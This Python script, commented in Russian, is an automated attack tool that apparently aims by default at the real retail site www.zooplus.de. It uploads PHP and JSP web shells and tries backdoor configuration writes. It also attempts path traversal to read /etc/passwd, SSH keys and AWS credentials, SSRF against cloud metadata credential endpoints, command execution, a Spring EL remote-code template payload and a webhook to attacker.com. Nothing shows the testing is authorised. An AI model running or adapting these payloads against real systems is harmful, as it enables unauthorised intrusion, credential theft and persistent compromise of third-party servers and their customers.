#!/usr/bin/env python3
"""
Test All Attack Vectors - комплексное тестирование всех векторов атаки
"""

import requests
import json
import base64
from urllib.parse import urljoin, quote
from datetime import datetime
import urllib3
urllib3.disable_warnings()

class AttackVectorTester:
    def __init__(self, target="www.zooplus.de"):
        self.target = target
        self.base_url = f"https://{target}"
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def log_finding(self, severity, vector_type, title, endpoint, method, payload, response_info):
        """Логирует находку"""
        finding = {
            "severity": severity,
            "type": vector_type,
            "title": title,
            "endpoint": endpoint,
            "method": method,
            "payload": payload,
            "response": response_info,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(finding)
        print(f"\n  [{severity}] {title}")
        print(f"      {method} {endpoint}")
        if payload:
            print(f"      Payload: {str(payload)[:150]}")
        print(f"      Response: {response_info}")
    
    def test_file_upload(self):
        """Тестирование File Upload вектора"""
        print("\n[*] Testing File Upload vectors...")
        
        endpoint = "/api/upload"
        url = urljoin(self.base_url, endpoint)
        
        # Различные типы файлов для загрузки
        test_files = [
            ("test.txt", "text/plain", "test content"),
            ("test.php", "application/x-php", "<?php system($_GET['cmd']); ?>"),
            ("test.jsp", "text/x-jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("test.jspx", "application/xml", "<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"cmd\"));</jsp:scriptlet>"),
            ("shell.php", "application/x-php", "<?php eval($_POST['x']); ?>"),
        ]
        
        # Различные форматы запросов
        for filename, content_type, content in test_files:
            # Multipart form data
            try:
                files = {'file': (filename, content, content_type)}
                resp = self.session.post(url, files=files, timeout=3, verify=False, allow_redirects=False)
                
                if resp.status_code in [200, 201, 302]:
                    self.log_finding(
                        "CRITICAL",
                        "file_upload",
                        f"File Upload Success: {filename}",
                        url,
                        "POST",
                        f"multipart/form-data: {filename}",
                        f"Status: {resp.status_code}, Location: {resp.headers.get('Location', 'N/A')}"
                    )
            except Exception as e:
                pass
            
            # JSON format
            try:
                payload = {
                    "file": base64.b64encode(content.encode()).decode(),
                    "filename": filename,
                    "content_type": content_type
                }
                resp = self.session.post(url, json=payload, timeout=3, verify=False, allow_redirects=False)
                
                if resp.status_code in [200, 201]:
                    self.log_finding(
                        "CRITICAL",
                        "file_upload",
                        f"File Upload Success (JSON): {filename}",
                        url,
                        "POST",
                        payload,
                        f"Status: {resp.status_code}"
                    )
            except Exception as e:
                pass
    
    def test_config_injection(self):
        """Тестирование Config Injection"""
        print("\n[*] Testing Config Injection vectors...")
        
        endpoint = "/api/config"
        url = urljoin(self.base_url, endpoint)
        
        # Сначала попробуем GET
        try:
            resp = self.session.get(url, timeout=3, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                self.log_finding(
                    "HIGH",
                    "config_read",
                    "Config Endpoint Readable",
                    url,
                    "GET",
                    None,
                    f"Status: {resp.status_code}, Length: {len(resp.text)}"
                )
        except:
            pass
        
        # Теперь попробуем изменить конфигурацию
        malicious_configs = [
            {"debug": True, "log_level": "debug"},
            {"env": {"BACKDOOR": "enabled", "DEBUG": "1"}},
            {"settings": {"allow_exec": True, "unsafe_mode": True}},
            {"config": {"exec": "enabled", "shell": "enabled"}},
        ]
        
        for config in malicious_configs:
            for method in ['POST', 'PUT', 'PATCH']:
                try:
                    resp = self.session.request(method, url, json=config, timeout=3, verify=False, allow_redirects=False)
                    
                    if resp.status_code in [200, 201, 204]:
                        self.log_finding(
                            "CRITICAL",
                            "config_write",
                            f"Config Injection Success ({method})",
                            url,
                            method,
                            config,
                            f"Status: {resp.status_code}"
                        )
                except:
                    pass
    
    def test_path_traversal(self):
        """Тестирование Path Traversal"""
        print("\n[*] Testing Path Traversal vectors...")
        
        base_path = "/stats/.."
        
        # Целевые файлы для доступа
        target_files = [
            "/etc/passwd",
            "/etc/hosts",
            "/proc/version",
            "/proc/self/environ",
            "/.env",
            "/config.json",
            "/.git/config",
            "/package.json",
            "/web.config",
            "/application.properties",
            "/.aws/credentials",
            "/.ssh/id_rsa",
        ]
        
        for target_file in target_files:
            # Различные path traversal паттерны
            traversal_patterns = [
                f"{base_path}{target_file}",
                f"{base_path}/../{target_file.lstrip('/')}",
                f"{base_path}/../../{target_file.lstrip('/')}",
                f"{base_path}/../../../{target_file.lstrip('/')}",
                quote(f"{base_path}{target_file}"),
            ]
            
            for path in traversal_patterns:
                try:
                    url = urljoin(self.base_url, path)
                    resp = self.session.get(url, timeout=2, verify=False, allow_redirects=False)
                    
                    if resp.status_code == 200:
                        # Проверяем, что это не просто HTML страница
                        if len(resp.text) < 10000 and not resp.text.strip().startswith('<!'):
                            # Проверяем признаки файла
                            if any(indicator in resp.text for indicator in ['root:', 'localhost', 'version', 'NODE_ENV', 'AWS_']):
                                self.log_finding(
                                    "CRITICAL",
                                    "path_traversal",
                                    f"Path Traversal Success: {target_file}",
                                    url,
                                    "GET",
                                    path,
                                    f"Status: {resp.status_code}, Content: {resp.text[:200]}"
                                )
                                break  # Found one, no need to continue
                except:
                    pass
    
    def test_ssrf(self):
        """Тестирование SSRF векторов"""
        print("\n[*] Testing SSRF vectors...")
        
        ssrf_endpoints = [
            "/api/fetch",
            "/api/proxy",
            "/api/request",
            "/api/url",
            "/api/import",
        ]
        
        # Внутренние цели
        internal_targets = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://kubernetes.default.svc",
            "http://istio-pilot.istio-system.svc.cluster.local",
        ]
        
        for endpoint in ssrf_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for target in internal_targets[:5]:  # Limit
                # Различные форматы payload
                payloads = [
                    {"url": target},
                    {"endpoint": target},
                    {"link": target},
                    {"uri": target},
                    {"path": target},
                    {"target": target},
                    {"request": {"url": target}},
                ]
                
                for payload in payloads:
                    try:
                        resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code in [200, 400, 500]:
                            # Проверяем признаки внутреннего сервиса
                            response_text = resp.text.lower()
                            if any(indicator in response_text for indicator in ['metadata', 'iam', 'credentials', 'kubernetes', 'istio']):
                                self.log_finding(
                                    "CRITICAL",
                                    "ssrf",
                                    f"SSRF Success: {target}",
                                    url,
                                    "POST",
                                    payload,
                                    f"Status: {resp.status_code}, Contains internal data"
                                )
                                break
                    except:
                        pass
    
    def test_code_execution(self):
        """Тестирование Code Execution"""
        print("\n[*] Testing Code Execution vectors...")
        
        exec_endpoints = [
            "/api/execute",
            "/api/eval",
            "/api/run",
            "/api/script",
            "/api/command",
            "/api/system",
            "/api/shell",
            "/api/cmd",
            "/api/exec",
            "/console",
        ]
        
        # Payloads для разных языков
        exec_payloads = [
            {"code": "print('test')"},
            {"command": "id"},
            {"script": "console.log('test')"},
            {"eval": "1+1"},
            {"exec": "echo test"},
            {"cmd": "whoami"},
            {"system": "uname -a"},
            {"shell": "ls -la"},
        ]
        
        for endpoint in exec_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for payload in exec_payloads:
                try:
                    resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                    
                    if resp.status_code == 200 and resp.text:
                        # Проверяем признаки выполнения
                        response_lower = resp.text.lower()
                        if any(indicator in response_lower for indicator in ['uid=', 'gid=', 'test', 'root', 'output', 'result']):
                            self.log_finding(
                                "CRITICAL",
                                "code_execution",
                                f"Code Execution Success: {endpoint}",
                                url,
                                "POST",
                                payload,
                                f"Status: {resp.status_code}, Output: {resp.text[:200]}"
                            )
                            break
                except:
                    pass
    
    def test_template_injection(self):
        """Тестирование Template Injection (SSTI)"""
        print("\n[*] Testing Template Injection vectors...")
        
        template_endpoints = [
            "/api/render",
            "/api/template",
            "/api/preview",
            "/render",
            "/template",
        ]
        
        # SSTI payloads для разных движков
        ssti_payloads = [
            {"template": "{{7*7}}"},  # Jinja2, Twig
            {"template": "${7*7}"},    # Freemarker
            {"template": "#{7*7}"},   # Expression Language
            {"template": "<%=7*7%>"}, # ERB
            {"template": "${7*7}"},    # Spring EL
            {"template": "{{config}}"}, # Jinja2 config
            {"template": "${T(java.lang.Runtime).getRuntime().exec('id')}"}, # Spring EL RCE
        ]
        
        for endpoint in template_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for payload in ssti_payloads:
                try:
                    resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                    
                    if resp.status_code == 200:
                        # Проверяем выполнение
                        if "49" in resp.text or "config" in resp.text.lower():
                            self.log_finding(
                                "CRITICAL",
                                "template_injection",
                                f"Template Injection Success: {endpoint}",
                                url,
                                "POST",
                                payload,
                                f"Status: {resp.status_code}, Response: {resp.text[:200]}"
                            )
                            break
                except:
                    pass
    
    def test_webhook_injection(self):
        """Тестирование Webhook Injection"""
        print("\n[*] Testing Webhook Injection vectors...")
        
        webhook_endpoints = [
            "/webhook",
            "/api/webhook",
            "/api/webhooks",
            "/callback",
            "/api/callback",
            "/notify",
            "/api/notify",
        ]
        
        # Тестовые callback URLs
        callback_urls = [
            "https://attacker.com/callback",
            "http://127.0.0.1:8080/callback",
            "http://169.254.169.254/latest/meta-data/",
        ]
        
        for endpoint in webhook_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for callback in callback_urls:
                payloads = [
                    {"url": callback},
                    {"callback": callback},
                    {"webhook": callback},
                    {"endpoint": callback},
                ]
                
                for payload in payloads:
                    try:
                        resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code in [200, 201, 202]:
                            self.log_finding(
                                "HIGH",
                                "webhook_injection",
                                f"Webhook Injection Success: {endpoint}",
                                url,
                                "POST",
                                payload,
                                f"Status: {resp.status_code}"
                            )
                            break
                    except:
                        pass
    
    def test_graphql(self):
        """Тестирование GraphQL"""
        print("\n[*] Testing GraphQL vectors...")
        
        graphql_endpoints = [
            "/graphql",
            "/api/graphql",
            "/graphql/v1",
            "/graphql/v2",
        ]
        
        # Introspection query
        introspection = {
            "query": "query IntrospectionQuery { __schema { queryType { name } } }"
        }
        
        # Mutation для тестирования
        mutations = [
            {"query": "mutation { updateConfig(key: \"backdoor\", value: \"enabled\") { success } }"},
            {"query": "mutation { executeCommand(cmd: \"id\") { output } }"},
        ]
        
        for endpoint in graphql_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            # Test introspection
            try:
                resp = self.session.post(url, json=introspection, timeout=2, verify=False, allow_redirects=False)
                if resp.status_code == 200 and "__schema" in resp.text:
                    self.log_finding(
                        "MEDIUM",
                        "graphql_introspection",
                        f"GraphQL Introspection Enabled: {endpoint}",
                        url,
                        "POST",
                        introspection,
                        f"Status: {resp.status_code}"
                    )
            except:
                pass
            
            # Test mutations
            for mutation in mutations:
                try:
                    resp = self.session.post(url, json=mutation, timeout=2, verify=False, allow_redirects=False)
                    if resp.status_code == 200:
                        self.log_finding(
                            "CRITICAL",
                            "graphql_mutation",
                            f"GraphQL Mutation Success: {endpoint}",
                            url,
                            "POST",
                            mutation,
                            f"Status: {resp.status_code}, Response: {resp.text[:200]}"
                        )
                except:
                    pass
    
    def run(self):
        """Запуск всех тестов"""
        print("=" * 70)
        print("ATTACK VECTORS TESTER")
        print("=" * 70)
        print(f"Target: {self.target}")
        print(f"Start Time: {datetime.now()}")
        print("=" * 70)
        
        # Запускаем все тесты
        self.test_file_upload()
        self.test_config_injection()
        self.test_path_traversal()
        self.test_ssrf()
        self.test_code_execution()
        self.test_template_injection()
        self.test_webhook_injection()
        self.test_graphql()
        
        # Генерируем отчет
        print("\n" + "=" * 70)
        print("TEST SUMMARY")
        print("=" * 70)
        print(f"Total Findings: {len(self.findings)}")
        
        if self.findings:
            critical = len([f for f in self.findings if f['severity'] == 'CRITICAL'])
            high = len([f for f in self.findings if f['severity'] == 'HIGH'])
            medium = len([f for f in self.findings if f['severity'] == 'MEDIUM'])
            
            print(f"  CRITICAL: {critical}")
            print(f"  HIGH: {high}")
            print(f"  MEDIUM: {medium}")
            
            # Группируем по типам
            by_type = {}
            for finding in self.findings:
                vtype = finding['type']
                by_type[vtype] = by_type.get(vtype, 0) + 1
            
            print("\nFindings by Type:")
            for vtype, count in by_type.items():
                print(f"  {vtype}: {count}")
            
            # Сохраняем отчет
            import os
            os.makedirs("reports", exist_ok=True)
            with open("reports/attack_vectors_test.json", "w") as f:
                json.dump({
                    "target": self.target,
                    "scan_date": datetime.now().isoformat(),
                    "total_findings": len(self.findings),
                    "findings_by_severity": {
                        "CRITICAL": critical,
                        "HIGH": high,
                        "MEDIUM": medium
                    },
                    "findings_by_type": by_type,
                    "findings": self.findings
                }, f, indent=2)
            
            print(f"\n[+] Report saved to: reports/attack_vectors_test.json")
            
            if critical > 0:
                print("\n[!!!] CRITICAL VULNERABILITIES FOUND!")
                print("     Review findings immediately!")
        else:
            print("  No exploitable vectors found")
        
        return self.findings

if __name__ == "__main__":
    tester = AttackVectorTester()
    tester.run()

